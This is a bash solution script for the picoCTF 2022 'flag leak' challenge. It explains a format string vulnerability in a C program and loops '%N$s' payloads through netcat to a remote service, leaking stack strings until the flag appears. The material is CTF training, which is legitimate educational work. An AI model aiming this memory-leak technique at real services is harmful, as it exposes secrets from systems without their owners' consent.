#!/bin/bash

#challenge picoCTF2022: flag leak
#Format String Vulnerability


<<comm
    printf("Tell me a story and then I'll tell you one >> ");
        scanf("%127s", story);

    --from this vulnerability what we can do is climb up the stack and leak as much data as we can
    --with ”%s” Read character strings from the process’ memory

    references: https://man7.org/linux/man-pages/man3/printf.3.html
                https://owasp.org/www-community/attacks/Format_string_attack
comm


for i in $(seq 1 256);do
    #positional parameters $1 = ip ; $2 = port
    result=$(echo "%$i\$s" | nc $1 $2)
    pico=$(echo $result | grep CTF | cut -d "-" -f 2 | tr -d " ")
    if [[ $pico =~ "CTF" ]];then
        echo "pico${pico}"
        exit
    fi
done